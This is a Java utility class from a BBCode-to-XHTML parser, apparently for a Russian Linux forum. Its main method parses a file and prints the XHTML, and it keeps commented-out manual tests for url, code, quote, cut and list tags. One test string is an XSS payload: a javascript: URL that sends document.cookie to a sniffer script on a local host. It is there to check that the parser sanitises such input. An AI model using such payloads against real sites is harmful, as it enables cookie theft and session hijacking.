package ru.org.bbcode;

import java.io.*;

/**
 * Created by IntelliJ IDEA.
 * User: hizel
 * Date: 6/30/11
 * Time: 9:51 PM
 */
public class ParserUtil {

    private static final Parser parser = new Parser();

    public static String bb2xhtml(String bbcode, boolean rootAllowsInline){
        return parser.parse(bbcode).renderXHtml();
    }

    public static String bb2xhtml(String bbcode, boolean rootAllowsInline, boolean renderCut, String cutUrl){
        return parser.parse(bbcode, renderCut, cutUrl).renderXHtml();
    }

    public static String correct(String bbcode, boolean rootAllowsInline){
        return parser.parse(bbcode).renderBBCode();
    }

    public static String to_html(String text){
        return bb2xhtml(text, false);
    }


    public static void main(String[] args) throws Exception{
        BufferedReader console = new BufferedReader(new InputStreamReader(System.in));

/*        String test_paragraph = "test\ntest\n\ntest";
        System.out.println(bb2xhtml(test_paragraph, false));

        String test_xss_url = "[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]";
        System.out.println(bb2xhtml(test_xss_url, false));

        String test_url = "[url]http://www.linux.org.ru/[/url] (можно с параметром, например: [url=http://www.example.com/]Сюда![/url])";
        System.out.println(bb2xhtml(test_url, false));

        String test_code = "[code]код[/code]";
        System.out.println(bb2xhtml(test_code, false));

        String test_code_param = "[code=java]код[/code]";
        System.out.println(bb2xhtml(test_code_param, false));

        String test_quote = "[quote]цитата[/quote]";
        System.out.println(bb2xhtml(test_quote, false));

        String test_quote_param = "[quote=\"название цитаты\"]цитата[/quote]";
        System.out.println(bb2xhtml(test_quote_param, false));

        String test_cut = "hello world[cut]hello[/cut]olololo";
        System.out.println(bb2xhtml(test_cut, false, false, "/msg"));

        String test_cut2 = "hello world[cut]hello[/cut]olololo";
        System.out.println(bb2xhtml(test_cut2, false, true, "/msg"));
        System.out.println(bb2xhtml(test_cut2, false, false, "/msg"));

        String test_list = "[list][*]1[*]2[list][*]1[*]2[/list][/list]";
        System.out.println(bb2xhtml(test_list, false, true, "/msg")); */

        String filename = System.getProperty("filename");
        System.err.println("Parse "+filename);
        BufferedReader in = new BufferedReader(new InputStreamReader(new FileInputStream(filename), "UTF8"));
        StringBuilder builder = new StringBuilder();
        String s;
        while( (s = in.readLine()) != null) {
            System.err.println("read>"+s);
            builder.append(s).append('\n');
        }

        System.out.println(bb2xhtml(builder.toString(), false, true, "/msg"));



/*        String line;
        System.out.print("> ");
        while(null != (line=console.readLine())){
            if("".equals(line.trim())){
                break;
            }
            String html = bb2xhtml(line, false);
            String bb = correct(line, false);

            System.out.println("html: "+html);
            System.out.println("bbcode: "+bb);

            System.out.print("> ");
        }*/
    }
}
